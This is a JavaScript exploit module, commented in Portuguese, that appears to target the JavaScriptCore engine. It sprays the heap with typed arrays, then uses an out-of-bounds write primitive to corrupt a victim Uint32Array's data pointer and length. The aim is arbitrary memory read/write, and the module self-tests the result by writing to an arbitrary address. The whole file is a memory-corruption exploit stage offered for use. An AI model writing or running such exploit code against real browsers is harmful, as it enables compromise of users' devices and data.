// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R45 - Construtor de Primitiva R/W)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_ARB_RW_BUILDER_R45 = "Heisenbug_ArbReadWriteBuilder_R45";

// NOVO: Variáveis globais para manter nossa primitiva e o array de controle.
let arb_rw_victim_array = null;
let arb_rw_controller_array = null; // Usado para grooming, mas a vítima é o alvo principal.

/**
 * NOVO: A função principal agora foca em construir a primitiva de R/W arbitrária.
 * Esta função substitui as tentativas anteriores de addrof.
 */
export async function executeArbReadWritePrimitiveBuilder_R45() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_ARB_RW_BUILDER_R45;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Construindo Primitiva de R/W Arbitrária ---`, "test", FNAME_CURRENT_TEST);
    
    let result = { success: false, msg: "Não iniciado.", errorOccurred: null };

    try {
        // --- FASE 0: PREPARAÇÃO ---
        logS3(`--- Fase 0 (R45): Preparação do Heap ---`, "subtest", FNAME_CURRENT_TEST);

        // O Heap Grooming é essencial para que nossa vítima seja alocada em um local previsível.
        let spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push(new Uint32Array(32));
        }
        arb_rw_controller_array = new Uint32Array(32);
        arb_rw_victim_array = new Uint32Array(32);
        spray = null; // Libera o spray, deixando os buracos para controller e victim.
        logS3(`[R45] Heap preparado. Arrays 'controller' e 'victim' criados.`, 'info');

        await PAUSE_S3(100);

        // --- FASE 1: CORRUPÇÃO DOS METADADOS DA VÍTIMA ---
        logS3(`--- Fase 1 (R45): Corrupção de Metadados ---`, "subtest", FNAME_CURRENT_TEST);
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
        
        // A suposição CRÍTICA: 'arb_rw_victim_array' está em um offset previsível
        // em relação ao nosso buffer OOB. Vamos precisar ajustar este offset.
        // Um valor inicial plausível, considerando o cabeçalho do buffer OOB.
        const ESTIMATED_OFFSET_TO_VICTIM = 0x50; // !! ESTE VALOR PRECISARÁ DE AJUSTE/FUZZING !!

        // Offsets dos metadados DENTRO do objeto Uint32Array (a View).
        const M_VECTOR_OFFSET = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const M_LENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;

        // Calcula os endereços de escrita absolutos (relativos ao nosso buffer OOB)
        const vector_write_target = ESTIMATED_OFFSET_TO_VICTIM + M_VECTOR_OFFSET;
        const length_write_target = ESTIMATED_OFFSET_TO_VICTIM + M_LENGTH_OFFSET;

        logS3(`[R45] Tentando corromper o ponteiro de dados ('m_vector') em ${toHex(vector_write_target)}`, 'info');
        // Escreve um ponteiro nulo (Low e High) para o 'm_vector'
        oob_write_absolute(vector_write_target, 0x0, 4);       // Parte baixa do ponteiro
        oob_write_absolute(vector_write_target + 4, 0x0, 4); // Parte alta do ponteiro

        logS3(`[R45] Tentando corromper o tamanho ('m_length') em ${toHex(length_write_target)}`, 'info');
        // Escreve um tamanho gigante para o 'm_length'
        oob_write_absolute(length_write_target, 0x7FFFFFFF, 4); // Tamanho máximo (positivo)

        await PAUSE_S3(150);

        // --- FASE 2: AUTO-TESTE DA NOVA PRIMITIVA ---
        logS3(`--- Fase 2 (R45): Auto-Teste da Primitiva ---`, "subtest", FNAME_CURRENT_TEST);
        
        // Se a corrupção funcionou, arb_rw_victim_array agora pode ler/escrever em qualquer lugar.
        // Vamos testar escrevendo um valor em um endereço alto e lendo de volta.
        const TEST_ADDRESS = 0x100000; // Um endereço arbitrário para teste
        const TEST_VALUE = 0xDEADBEEF;
        const test_index = TEST_ADDRESS / 4; // Para um Uint32Array

        logS3(`[R45-Test] Escrevendo ${toHex(TEST_VALUE)} no endereço ${toHex(TEST_ADDRESS)}...`, 'info');
        arb_rw_victim_array[test_index] = TEST_VALUE;
        
        logS3(`[R45-Test] Lendo de volta do endereço ${toHex(TEST_ADDRESS)}...`, 'info');
        let read_back_value = arb_rw_victim_array[test_index];

        if (read_back_value === TEST_VALUE) {
            result.success = true;
            result.msg = `Auto-teste passou. Lido ${toHex(read_back_value)} do endereço ${toHex(TEST_ADDRESS)}.`;
            logS3(`[R45] SUCESSO! ${result.msg}`, 'vuln');
        } else {
            result.success = false;
            result.msg = `Auto-teste falhou. Lido ${toHex(read_back_value)}, esperado ${toHex(TEST_VALUE)}. O offset estimado (${toHex(ESTIMATED_OFFSET_TO_VICTIM)}) provavelmente está incorreto.`;
            logS3(`[R45] FALHA! ${result.msg}`, 'error');
        }

    } catch (e_outer) {
        result.errorOccurred = e_outer;
        logS3(`  CRITICAL ERROR (R45): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R45 test:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
